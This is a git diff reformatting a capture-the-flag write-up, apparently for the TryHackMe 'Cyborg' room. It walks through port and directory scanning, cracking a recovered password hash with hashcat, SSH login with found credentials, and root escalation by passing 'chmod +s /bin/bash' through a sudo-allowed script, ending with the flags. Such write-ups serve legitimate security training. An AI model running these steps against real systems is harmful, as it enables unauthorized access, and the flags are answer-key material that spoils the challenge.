@@ -12,7 +12,7 @@ pagination_prev: null
 
 ## Task 2: Compromise the System
 ### Scan the machine, how many ports are open?
-- Let's perform an `nmap` scan on the IP address.
+Let's perform an `nmap` scan on the IP address.
 ```
 $ nmap -sC -sV 10.10.228.18
 Starting Nmap 7.92 ( https://nmap.org ) at 2023-11-12 14:30 IST
@@ -33,7 +33,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 45.99 seconds
 ```
-- As we can see there are two open ports:
+As we can see there are two open ports:
 
 | Port | Service | 
 |---|---|
@@ -64,11 +64,11 @@ HTTTP
 &nbsp;
 
 ### What is the user.txt flag?
-- Let's check the IP address through the browser.
+Let's check the IP address through the browser.
 
 ![2](https://github.com/Knign/Write-ups/assets/110326359/8a85076a-7870-41e6-8abf-ec595aac7c4d)
 
-- Now that we know it is hosting a `apache2` server, we can brute force the directories using `gobuster`.
+Now that we know it is hosting a `apache2` server, we can brute force the directories using `gobuster`.
 ```
 $ gobuster dir -u http://10.10.228.18 -w /usr/share/wordlists/dirb/small.txt 
 ===============================================================
@@ -94,25 +94,26 @@ Progress: 959 / 960 (99.90%)
 Finished
 ===============================================================
 ```
-- Let's go to the `admmin` directory and see what we can find.
+Let's go to the `admmin` directory and see what we can find.
 
 ![3](https://github.com/Knign/Write-ups/assets/110326359/3870ef97-743d-4637-8af3-9378a7202e0f)
 
-- Let's go to the `Admin` page.
+Let's go to the `Admin` page.
 
 ![4](https://github.com/Knign/Write-ups/assets/110326359/af7be9ad-a52a-4550-a901-fd6ded193313)
 
-- From what Alex said in his final message, we know that he has probably set up a squid proxy.
-- Before we look for it's directory let's see what `Archive` has.
+From what Alex said in his final message, we know that he has probably set up a squid proxy.
+
+Before we look for it's directory let's see what `Archive` has.
 
 ![5](https://github.com/Knign/Write-ups/assets/110326359/ded7ca6c-d3f7-488f-b6fe-8770af0e5cc6)
 
-- Let's click on `Download`.
+Let's click on `Download`.
 ```
 $ ls
 archive.tar
 ```
-- We can extract his archive using the `tar` utility.
+We can extract his archive using the `tar` utility.
 ```
 $ tar -xvf archive.tar 
 home/field/dev/final_archive/
@@ -129,30 +130,36 @@ home/field/dev/final_archive/data/0/3
 home/field/dev/final_archive/data/0/4
 home/field/dev/final_archive/data/0/1
 ```
-- After extracting the archive, if we go to `home/field/dev/final_archive` and cat the `README` file present there we get the following information.
+After extracting the archive, if we go to `home/field/dev/final_archive` and cat the `README` file present there we get the following information.
 ```
 $ cat README 
 This is a Borg Backup repository.
 See https://borgbackup.readthedocs.io/
 ```
 #### BORG backup
-- BORG is a  duplication program used to securely and efficiently backup data.
-- It can also be used to backup entire filesystems which can then be mounted onto other filesystems for easier examination.
-- Having read the messages between the two admin, we can guess that this is a probably a backup of Alex's filesystem.
-- However, before we do that, let's first check out the `etc` directory as well.
+BORG is a  duplication program used to securely and efficiently backup data.
+It can also be used to backup entire filesystems which can then be mounted onto other filesystems for easier examination.
+
+Having read the messages between the two admin, we can guess that this is a probably a backup of Alex's filesystem.
+However, before we do that, let's first check out the `etc` directory as well.
 
 ![7](https://github.com/Knign/Write-ups/assets/110326359/6f6994a4-1639-4bad-a156-e7db0dda3047)
 
-- Ah! So this is where the `squid` directory for the Squid proxy was located. Let's go inside.
+Ah! So this is where the `squid` directory for the Squid proxy was located. Let's go inside.
 
 ![8](https://github.com/Knign/Write-ups/assets/110326359/0e07adff-6dad-4b9a-94ad-0448df5ab556)
 
-- The `passwd` file probably has some useful information.
+The `passwd` file probably has some useful information.
 
 ![9](https://github.com/Knign/Write-ups/assets/110326359/2c6ee7a6-5087-44eb-9043-84a992071be5)
 
-- We have what looks to be a pair of a username `music_archive` and a hashed password `$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.`.
-- Let's identify the hash using the `hash-identifier` utility.
+We have what looks to be a pair of a username `music_archive` and a hashed password `$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.`.
+
+| Username | Password hash |
+|-|-|
+| music_archive | $apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn. |
+
+Let's identify the hash using the `hash-identifier` utility.
 ```
 $ hash-identifier
    #########################################################################
@@ -173,11 +180,11 @@ $ hash-identifier
 Possible Hashs:
 [+] MD5(APR)
 ```
-- Before we crack the hash let's save the hash in a `hash.txt` file and take a look at the hash-mode for MD5(APR).
+Before we crack the hash let's save the hash in a `hash.txt` file and take a look at the hash-mode for MD5(APR).
 
 ![10](https://github.com/Knign/Write-ups/assets/110326359/2974bd92-6ea7-4246-8aec-2e07e064a859)
 
-- Now we can use `hashcat` to crack the hash.
+Now we can use `hashcat` to crack the hash.
 ```
 $ hashcat -a 0 -m 1600 hash.txt /usr/share/wordlists/rockyou.txt                          
 hashcat (v6.2.5) starting
@@ -238,21 +245,27 @@ Hardware.Mon.#1..: Util: 68%
 Started: Sun Nov 12 15:15:28 2023
 Stopped: Sun Nov 12 15:16:16 2023
 ```
-- Now we know both the username and the password.
-- We are all set to extract the Alex's filesystem. We can use the `borg` utility to do this.
+Now we know both the username and the password.
+
+| Username | Password |
+|-|-|
+| music_archive | squidward |
+
+We are all set to extract the Alex's filesystem. We can use the `borg` utility to do this.
 ```
 $ borg extract /home/kunal/tryhackme/cyborg/home/field/dev/final_archive::music_archive
 Enter passphrase for key /home/kunal/tryhackme/cyborg/home/field/dev/final_archive: 
 ```
-- If we then go to the `home/alex/Documents` directory, we see a `note.txt` file. 
-- Let's `cat` out the file.
+If we then go to the `home/alex/Documents` directory, we see a `note.txt` file. 
+
+Let's `cat` out the file.
 ```
 $ cat note.txt 
 Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!
 
 alex:S3cretP@s3
 ```
-- Let's try to `ssh` into the machine using the above credentials.
+Let's try to `ssh` into the machine using the above credentials.
 ```
 $ ssh alex@10.10.228.18      
 The authenticity of host '10.10.228.18 (10.10.228.18)' can't be established.
@@ -281,13 +294,14 @@ applicable law.
 
 alex@ubuntu:~$ 
 ```
-- We have successfully logged on to Alex's machine.
-- Let's look around to see what we can find.
+We have successfully logged on to Alex's machine.
+
+Let's look around to see what we can find.
 ```
 $ ls
 Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
 ```
-- The `user.txt` file seems interesting. Let's check it's contents.
+The `user.txt` file seems interesting. Let's check it's contents.
 ```
 $ cat user.txt 
 flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}
@@ -300,8 +314,9 @@ flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}
 &nbsp;
 
 ### What is the root.txt flag?
-- In order to find the root flag we need to become the `root` user.
-- Using the `sudo` command we can see what files we can execute 
+In order to find the root flag we need to become the `root` user.
+
+Using the `sudo` command we can see what files we can execute 
 ```
 $ sudo -l
 Matching Defaults entries for alex on ubuntu:
@@ -311,7 +326,7 @@ User alex may run the following commands on ubuntu:
     (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
 
 ```
-- We can see the `/etc/mp3backups/backup.sh` script can be executed by any user, including us.
+We can see the `/etc/mp3backups/backup.sh` script can be executed by any user, including us.
 ```bash title="backup.sh"
 #!/bin/bash
 
@@ -360,24 +375,26 @@ echo "Backup finished"
 cmd=$($command)
 echo $cmd
 ```
-- Looking inside the `while` look, we can see that the program takes in user command identified by `-c`, and executes it.
-- Using this knowledge, we can set the `suid` bit on the `/bin/bash` file.
+Looking inside the `while` look, we can see that the program takes in user command identified by `-c`, and executes it.
+
+Using this knowledge, we can set the `suid` bit on the `/bin/bash` file.
 ```
 $ sudo /etc/mp3backups/backup.sh -c "chmod +s /bin/bash"
 ```
-- Now on executing the `bash` command, we will get root privilege.
-- Let's check our effective ID.
+Now on executing the `bash` command, we will get root privilege.
+
+Let's check our effective ID.
 ```
 bash-4.3# id
 uid=1000(alex) gid=1000(alex) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),1000(alex)
 ```
-- We can now go the `/root` directory.
+We can now go the `/root` directory.
 ```
 bash-4.3# cd /root
 bash-4.3# ls
 root.txt
 ```
-- Let's `cat` the flag.
+Let's `cat` the flag.
 ```
 bash-4.3# cat root.txt 
 flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
